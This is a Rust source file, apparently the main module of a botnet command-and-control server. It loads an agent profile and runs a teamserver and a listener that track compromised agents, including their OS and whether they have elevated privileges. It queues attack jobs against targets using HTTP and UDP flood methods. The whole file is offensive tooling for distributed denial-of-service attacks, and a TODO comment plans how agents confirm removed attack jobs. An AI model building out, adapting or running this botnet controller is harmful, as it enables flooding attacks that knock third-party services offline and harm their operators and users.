mod listener;
mod teamserver;

use std::{fs, io::Read, str::FromStr, sync::Arc, time::Duration};

use toml;
use serde::{Serialize, Deserialize};
use serde_json::Value;

use tokio::sync::Mutex;

const TEAMSERVER_ADDR: &str = "127.0.0.1:5555";
const LISTENER_ADDR: &str = "127.0.0.1:8000";

type ArcMutexVec<T> = Arc<Mutex<Vec<T>>>;

#[derive(Deserialize)]
struct ProfileConfig {
    agents: ProfileAgents,
    users: Value 
}

#[derive(Deserialize)]
struct ProfileAgents {
    allowed: Vec<String>,
    sleep: f64,
    jitter: f32
}

#[derive(Serialize, PartialEq)]
enum AttackMethod { 
    HTTP,
    UDPFLOOD
}

impl FromStr for AttackMethod {
    type Err = ();
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "HTTP" => Ok(AttackMethod::HTTP),
            "UDPFLOOD" => Ok(AttackMethod::UDPFLOOD),
            _ => Err(())
        }
        
    }
}

#[derive(Serialize)]
struct Job {
    uuid: String,
    target: String,
    method: AttackMethod,
    duration: Duration,
    agents: isize,
}

#[derive(Serialize)]
struct Agent {
    uuid: String,
    addr: String,
    os: String,
    elevated: bool,
    sleep: f64,
    jitter: f32,
    last_ping: i64,
}

struct MAShared {
    profile: Arc<ProfileConfig>,
    jobs: ArcMutexVec<Job>, 
    agents: ArcMutexVec<Agent>, 
}

// TODO: Add: agent building
// TODO: Add: "remove job": for removing a job you need to add a UUID to the Job struct. When remove job
// is called add to the job UUID to a "removed jobs" and can be accessible via /target endpoint, when
// agents did remove the attack job, then sent a POST request to /target saying "removed job". if
// removed job counter is equal to agents that say "removed job", server removes UUID job to
// "removed job"

#[tokio::main]
async fn main() -> Result<(), std::io::Error> {
    let mut config_string = String::new();

    // Config parsing

    let mut file_config = fs::File::open("config/profile.toml").unwrap();
    file_config.read_to_string(&mut config_string).unwrap();
    let config_parsed = toml::from_str(&config_string).unwrap();
    let config_parsed_arc: Arc<ProfileConfig> = Arc::new(config_parsed);

    // Spawning tasks

    let jobs: Arc<Mutex<Vec<Job>>> = Arc::new(Mutex::new(Vec::new()));
    let agents: Arc<Mutex<Vec<Agent>>> = Arc::new(Mutex::new(Vec::new()));

    let shared = MAShared { profile: config_parsed_arc, jobs, agents };
    let shared_arc = Arc::new(shared);
    let shared_arc_clone = Arc::clone(&shared_arc);

    let teamserver_task = tokio::task::spawn( async { teamserver::run(TEAMSERVER_ADDR, shared_arc).await } );
    let listener_task = tokio::task::spawn( async { listener::run(LISTENER_ADDR, shared_arc_clone).await } );

    // Joining tasks

    teamserver_task.await.unwrap();
    listener_task.await.unwrap();

    Ok(())
}
